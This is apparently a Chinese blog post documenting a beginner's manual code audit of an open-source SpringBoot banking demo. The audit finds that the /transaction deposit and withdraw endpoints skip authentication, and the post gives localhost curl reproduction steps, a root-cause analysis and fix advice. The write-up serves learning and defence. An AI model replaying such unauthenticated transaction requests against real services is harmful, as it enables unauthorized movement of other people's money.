---
title: 拿个简单开源 SpringBoot 项目审计练手，顺手找了个未授权漏洞
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145837036.png
categories:
  - [实战, 代码审计]
tags:
  - 代码审计
  - Java
  - SpringBoot
  - Spring Security
  - JWT
  - 未授权访问
abbrlink: a7b8c9d0
date: 2026-05-26 17:00:00
---
# 拿个简单开源 SpringBoot 项目审计练手，顺手找了个未授权漏洞

---

## 目录

- [前言](#前言)
- [环境搭建](#环境搭建)
- [项目结构分析](#项目结构分析)
- [入口审计：Controller + Security](#入口审计controller--security)
- [认证接口测试：/auth/**](#认证接口测试auth)
- [漏洞发现：/transaction/** 未鉴权](#漏洞发现transaction-未鉴权)
- [漏洞复现](#漏洞复现)
- [漏洞总结](#漏洞总结)

---

## 前言

网上找的一个简单的开源代码审计项目，其实漏洞很简单，只是自己第一次做人工审计，记录一下整个思路过程。

---

## 环境搭建

下载源码，发现只有后端代码，没有前端，是个 Maven 项目，数据库用的是 PostgreSQL , 用 Docker 替代搭建一下环境。

看看项目的结构，50 个文件左右，文件算少的了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145658293.png)

---

## 项目结构分析

### 目录划分

先大概分析一下各目录的职责：

- **config**：放配置类，比如 OpenAPI、Swagger 之类
- **controller**：外部入口，HTTP 请求先到这里，SpringBoot 控制器，之前的内存马也是这个层
- **entity**：里面都是实体对象

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145700198.png)

- **exception**：异常处理，全局报错怎么返回
- **mapper**：实体转换相关

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145702324.png)

- **security**：安全相关，JWT、过滤器、权限配置。**这里很值得关注，往往这里就存在漏洞或者不严格的鉴权**
- **utils**：工具类
- **BankManagementSystemApplication**：程序启动入口
- **resources/application.properties**：配置文件，数据库连接等通常在这里

---

### MVC 架构补充

顺带理一下这个项目用的 MVC 架构是什么：

MVC = **M**odel + **V**iew + **C**ontroller，是一种把程序分工拆开的思路。

**1. Controller（控制器）**

负责：接收用户请求、决定调用谁处理、把结果返回出去。在 Web 项目里通常就是：处理 URL、处理 GET/POST、接收参数、返回 JSON / 页面。

Controller 总共 5 个文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145704033.png)

都是标准的 Controller 文件写法，用来处理 URL 路由规则的。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145705696.png)

**2. View（视图）**

负责：把结果展示给用户看。传统 MVC 里，这通常是 HTML 页面、JSP、Thymeleaf、模板引擎页面。

**这个项目里几乎没有 View**，因为这是个前后端分离/纯后端 API 项目，它不负责渲染页面，只是返回 JSON。

**3. Model（模型）**

负责：业务数据、业务规则、数据处理。但在现代 Spring 项目里，Model 往往不会只放一个目录，而是拆成很多层。

在这个项目里，Model 被拆成了：
- `entity`：数据库实体
- `model`：请求/响应数据结构
- `service`：业务逻辑
- `repository`：数据库读写
- `mapper`：对象转换

文件看着挺多：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145708772.png)

但实际上的代码因为分得比较细，每个文件内容都很少。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145710900.png)

---

## 入口审计：Controller + Security

先看看入口和安全类，重点就是 **controller + security** 这两块。

### AccountController 初探

先看 `AccountController.java`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145713551.png)

第一个接口是 `/accounts`，里面有 POST 和 GET：
- POST：创建用户
- GET：查看用户信息

直接试了试 GET 和 POST 的请求，返回的都是 403：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145716186.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145718484.png)

被禁止了，说明有鉴权。但是看 AccountController 代码里面，并没有任何检测或者鉴权的代码，说明 HTTP 请求还没进入这里就已经被拦截了。

尝试直接找 `/accounts` 看有没有被拦截的路由规则，但是只找到原本的那一个：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145720726.png)

接下来的思路应该是断点看看到底哪里被拦截了，不过因为代码比较少，就直接随便翻翻了。

---

### 定位鉴权逻辑：SecurityConfiguration

在 `security/SecurityConfiguration.java` 里找到了类似的信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145723142.png)

这一看就是路径检测的地方：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145725680.png)

这里用到了 `@Bean` 和 `SecurityFilterChain`（这是返回的对象类型，不是名字）。

- `@Bean`：Spring 会把这个方法返回的对象注册成一个 Bean
- `SecurityFilterChain`：Spring Security 自带的类型，这个方法返回了一个 Spring Security 认识的安全过滤链配置对象，相当于"请求经过时要怎么鉴权"的规则集合

里面几个关键方法需要关注：

- `.requestMatchers(...)`：看列了哪些路径
- `.permitAll()`：这些路径不需要认证，刚刚 `/accounts` 路径不在里面，所以直接访问才被禁止了
- `.anyRequest().authenticated()`：其他所有请求都要认证
- `.addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)`：说明它用了 JWT 认证过滤器

`addFilterBefore` 这个非常熟悉，就是在过滤器链最前面注册 `jwtAuthFilter`。

这里注册的是 Filter 而不是 Spring 里的 Interceptor——虽然 Interceptor 也在 Controller 之前，但它们偏 MVC 层，Servlet 的东西都是在 Filter 之后。认证机制越早越好，一般都是放在 Filter 甚至更早。

> Interceptor 常做：日志、统计耗时、简单权限补充判断、请求参数预处理、某些业务级检查。而不像 Filter 那样承担"整套安全认证入口"的职责。

从前面的 `private final JwtAuthenticationFilter jwtAuthFilter;` 可以看到，`jwtAuthFilter` 来自 `JwtAuthenticationFilter`，这是作者自己写的类。

这里有个有意思的地方：他的定义不是直接 `new` 一个 `JwtAuthenticationFilter`，而是直接声明字段——说明是依赖注入进来的，来看看 `JwtAuthenticationFilter` 的代码：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145727774.png)

可以看到这就是一个 Filter，但是和之前学的 Tomcat 内存马里手动注册的 Filter 不太一样，这是 Spring 的托管版本。

其中 `@Component` 注解能被 Spring 检测、创建并注入，托管到 Bean 容器。类似的注解还有：

- `@Component`
- `@Service`
- `@Repository`
- `@Configuration`
- 通过 `@Bean` 手动注册

`SecurityConfiguration` 里有 `@Configuration`，也会被 Spring 托管。所以 `private final JwtAuthenticationFilter jwtAuthFilter` 和 `private final AuthenticationProvider authenticationProvider` 这些依赖，Spring 都会自动注入进来。

---

回到正题，已知这部分路径是不需要鉴权的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145730016.png)

真正业务上公开放行的只有：`/auth/**` 和 `/transaction/**` 这两个，其他的都是 Swagger 相关的。实际上 Swagger 这种 API 文档接口最好也不要随意公开泄露。

---

## 认证接口测试：/auth/**

先试试 `/auth`，在 `AuthenticationController` 里找到：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145732216.png)

- POST `/auth/register`
- POST `/auth/login`

试了试 GET 访问，返回的还是 403：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145734415.png)

换 POST 试试：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145736871.png)

虽然 500，但至少不是鉴权失败了，证明之前的分析没问题。这个 500 的意思大概就是**请求体（request body）缺失**。

随便添加数据：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145739464.png)

不仅这里能看到请求体需要 JSON 数据，源代码也能体现：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145741926.png)

---

### @RequestBody 与 @Valid 说明

重点看这里：`@RequestBody RegisterRequestModel request`

**`@RequestBody` 的意思**：把 HTTP 请求体里的内容，解析成一个 Java 对象。在这种 REST API 项目里，通常就是请求体是 JSON，Spring 把 JSON 转成对应的 Model 类。

**为什么没传 body 会报错**：因为 Spring 在看到 `@RequestBody` 时，会强制去请求体里找数据，没给就报 `Required request body is missing`。

**`@Valid` 是干什么的**：在 `@Valid @RequestBody RegisterRequestModel request` 里，`@RequestBody` 要求有 body，`@Valid` 还要校验 body 里的字段是否符合规则，比如是否为空、长度是否符合、数值是否有效。

**那怎么知道 JSON 里要传哪些字段**：看参数对应的类：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145744148.png)

看里面字段：`name`、`phone`、`email`、`password`，再看有没有注解 `@NotNull`、`@Size`、`@Min`，这样就能知道要传哪些字段、哪些必须有、规则是什么。

---

### 注册与登录验证

`/auth/register` 构造好参数：

```json
{
    "username": "zhangsan_2026",
    "password": "Password@123",
    "email": "zhangsan_20260525@test.com",
    "name": "张三",
    "phone": "15012348888"
}
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145746508.png)

响应：

```json
{
  "status": "CREATED",
  "success": true,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ6aGFuZ3Nhbl8yMDI2MDUyNUB0ZXN0LmNvbSIsImlhdCI6MTc3OTY4NDk4MSwiZXhwIjoxNzc5ODI4OTgxfQ.rlrqCIB0c9ST3joFxOAd7wuF7G7wCu2hV6EGFJPHR-4"
  },
  "errors": null
}
```

可以拿到一个 JWT，正常。

试试 `/login`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145749166.png)

可以登录，也是返回 JWT。测试发现不同时间登录返回的 JWT 也不同，正常。

解码 Payload（载荷）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145751504.png)

里面有 JWT 时间限制，正常。再次用相同账号注册，返回已存在，正常：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145753719.png)

---

## 漏洞发现：/transaction/** 未鉴权

换个接口，`/transaction/**`，这个路径是公开放行的，但不确定里面是否还有内部的 JWT 检测。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145755988.png)

### TransactionController 分析

两个 POST 接口：
- `POST /transaction/deposit`（存款）
- `POST /transaction/withdraw`（取款）

```java
deposit(@Valid @RequestBody DepositRequestModel request)
withdraw(@Valid @RequestBody WithdrawRequestModel request)
```

两个都需要 JSON 对象。

看 `DepositRequestModel`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145758640.png)

只需要 `card_number` 和 `amount`。

看 `WithdrawRequestModel`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145800730.png)

需要 `card_number`、`cvv`、`amount`，比 DepositRequestModel 多了个 `cvv`。

初步看来似乎并不需要 Token 之类的 JWT 参数。不过 JWT 不仅能放 body 里，也能放在 Cookie、请求头里，还不能下结论：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145802861.png)

---

### 业务逻辑追踪

可以看到业务处理在 `transactionService` 里：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145805346.png)

点击跳转，这明显就是项目自己定义的接口，而实现这个方法的就是 `TransactionServiceImpl`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145807298.png)

里面有 `deposit` 和 `withdraw` 方法，进去看看。

第一个 `deposit` 方法里面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145809844.png)

这里就三件事：
1. `findByCardNumber`：从 JSON 里 get 出 `card_number`（这个 get 方法是因为 `DepositRequestModel` 有 `@Data` 注解，会自动生成 set/get/toString 等方法）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145812322.png)

2. `performDeposit`：用来计算金额的
3. `toResponseModel`：处理返回响应的内容

`withdraw` 也是差不多的，按目前看来，确实不需要什么认证验证，只需要知道 CVV 和卡号。

---

### 卡号和 CVV 的来源

在 `model` 里找到 `AccountResponseModel`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145814614.png)

这里直接定义了 `card_number` 和 `cvv`。`AccountMapperImpl` 是用来获取数值的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145816937.png)

`AccountServiceImpl` 实现了 `AccountService` 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145819115.png)

里面就有 `createNewAccount` 和 `getMyAccounts` 方法，重点看 `createNewAccount`，这个卡号和 CVV 怎么来的：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145821619.png)

大概有四个关键点：
1. `getAuthentication`：这一看就是鉴权的，需要 JWT
2. `findByEmail`：找账号的，不存在会提示 Not Found，说明创建账户之前还是需要注册一个账号，鉴权也需要注册时生成的 JWT
3. `.cardNumber(generateUniqueCardNumber()).cvv(Utils.generateCVV())`：这两个是创建卡号和 CVV 的
4. `toResponseModel`：处理响应内容

但这里还有个问题——回显里能看到卡号和 CVV 吗？

`toResponseModel` 是 `accountMapper` 的方法，`accountMapper` 是 `AccountMapper` 类型：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145824063.png)

`AccountMapper` 只是一个接口：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145825751.png)

找实现类 `AccountMapperImpl`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145827459.png)

`AccountMapperImpl` 实现了 `AccountMapper`，里面返回的是 `AccountResponseModel`，包含了卡号和 CVV 等信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145830185.png)

在 `AccountResponseModel` 里有注解 `@Builder`，对应的 builder 调用就是：

```java
.builder()
.card_number(account.getCardNumber())
.cvv(account.getCvv())
.balance(account.getBalance())
.build();
```

等价于：

```java
AccountResponseModel.setCard_number(account.getCardNumber());
AccountResponseModel.setCvv(account.getCvv());
AccountResponseModel.setBalance(account.getBalance());
```

**所以是有回显的，卡号和 CVV 都会在响应里返回。**

再看看 `getAuthentication` 是怎么工作的，回到 `JwtAuthenticationFilter`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145832260.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145834435.png)

可以看出来，JWT 是在请求头 `Authorization` 里检测的，格式是 `Bearer ` + JWT。

---

**总结整个流程**：先注册一个用户拿到 JWT，利用 JWT 创建账户并从回显里拿到卡号和 CVV，而用这两个信息可以直接对 `/transaction/**` 接口执行资金操作，**不需要任何 JWT 认证**。

> 知道卡号即可未认证存钱，知道卡号和 CVV 即可未认证取钱。

---

## 漏洞复现

**第一步**：注册一个新用户

```bash
curl.exe -X POST "http://localhost:8080/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","phone":"13912345678","email":"test123@example.com","password":"Passw0rd!"}'
```

从注册响应中取出 `data.token`：

```json
{
  "status": "CREATED",
  "success": true,
  "data": { "token": "<jwt_token>" },
  "errors": null
}
```

**第二步**：使用 JWT 创建账户，拿到 `card_number` 和 `cvv`

```bash
curl.exe -X POST "http://localhost:8080/accounts" `
  -H "Authorization: Bearer <jwt_token>"
```

响应：

```json
{
  "status": "CREATED",
  "success": true,
  "data": {
    "card_number": "7599654302553651",
    "cvv": "637",
    "balance": 0.0
  },
  "errors": null
}
```

**第三步**：在不发送任何 Authorization 请求头的情况下，直接存款

```bash
curl.exe -X POST "http://localhost:8080/transaction/deposit" \
  -H "Content-Type: application/json" \
  -d '{"card_number":"<card_number>","amount":50}'
```

响应：

```json
{
  "status": "OK",
  "success": true,
  "data": { "id": 26, "amount": 50.0, "balance": 50.0 },
  "errors": null
}
```

**第四步**：同样不带认证，直接取款

```bash
curl.exe -X POST "http://localhost:8080/transaction/withdraw" \
  -H "Content-Type: application/json" \
  -d '{"card_number":"<card_number>","cvv":"<cvv>","amount":20}'
```

响应：

```json
{
  "status": "OK",
  "success": true,
  "data": { "id": 27, "amount": 20.0, "balance": 30.0 },
  "errors": null
}
```

**第五步**：带 JWT 查看账户余额确认变更

```bash
curl.exe "http://localhost:8080/accounts" `
  -H "Authorization: Bearer <jwt_token>"
```

响应：

```json
{
  "status": "OK",
  "success": true,
  "data": [{"card_number":"4494984739494771","cvv":"862","balance":30.0}],
  "errors": null
}
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260526145837036.png)

---

## 漏洞总结

**预期行为**：`/transaction/deposit` 和 `/transaction/withdraw` 两个接口都应要求用户认证，并在处理交易前校验目标账户归属，而不应仅凭请求体中的 `card_number` 或 `card_number + cvv` 直接执行资金操作。

**实际行为**：两个请求在未认证情况下均成功执行，并直接修改目标账户余额。

**影响**：攻击者无需持有有效登录会话即可执行未经授权的资金操作。对于存款，只要知道有效卡号即可调用；对于取款，只要知道有效卡号和 CVV 即可调用。由于系统将资金操作的访问控制错误地退化为"知道交易标识信息即可"，一旦这些值因客户端泄露、日志泄露、前端暴露、会话泄露或其他方式被获取，攻击者即可直接发起交易请求。

**根本原因**：`SecurityConfiguration` 中 `/transaction/**` 被配置为 `permitAll()`，但 `TransactionServiceImpl` 内部并没有做任何身份校验，也没有校验操作的账户是否属于当前登录用户。正确的做法是在 Security 配置中要求 `/transaction/**` 认证，或者在 Service 层通过 `SecurityContextHolder.getContext().getAuthentication()` 获取当前用户，再校验目标卡号的归属。
